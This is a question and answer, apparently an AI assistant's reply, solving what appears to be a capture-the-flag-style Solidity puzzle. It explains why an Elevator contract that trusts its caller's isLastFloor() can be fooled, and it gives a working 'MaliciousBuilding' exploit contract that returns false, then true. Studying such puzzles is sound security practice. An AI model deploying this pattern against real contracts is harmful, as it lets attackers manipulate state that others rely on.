How can I set the variable top to true without modifying the contract?
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

Assuming the goal is to exploit the Elevator contract to set the top variable to true without modifying the Elevator contract itself, the way to do this would be to create a malicious Building contract that tricks the Elevator into thinking it has reached the top floor.

In the Elevator contract, the goTo() function checks if the new floor is the last floor in the building. It does so by calling isLastFloor() from the Building contract and if it returns false, it will set the floor variable and then make another call to isLastFloor() which decides the value of top.

Therefore, to trick Elevator into setting top to true, we can design a malicious Building contract that will return false for the first call to isLastFloor(), and true for the second. This could be achieved by using a state variable in our malicious Building contract that keeps track of how many times isLastFloor() has been called, something like this:

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Elevator.sol'; // import the Elevator contract

contract MaliciousBuilding {
  uint public callCount = 0;

  function isLastFloor(uint _floor) external returns (bool) {
    if (callCount == 0) {
      callCount++;
      return false;
    } else {
      return true;
    }
  }

  function attack(Elevator elevator) public {
    elevator.goTo(1);
  }
}

In this code, attack() function is the trigger for the attack. It calls goTo() function in the Elevator contract with a floor value. When goTo() calls isLastFloor() for the first time, callCount is 0, so it returns false and increments callCount. When goTo() calls isLastFloor() for the second time, callCount is not 0, so it returns true, tricking the Elevator into setting top to true.
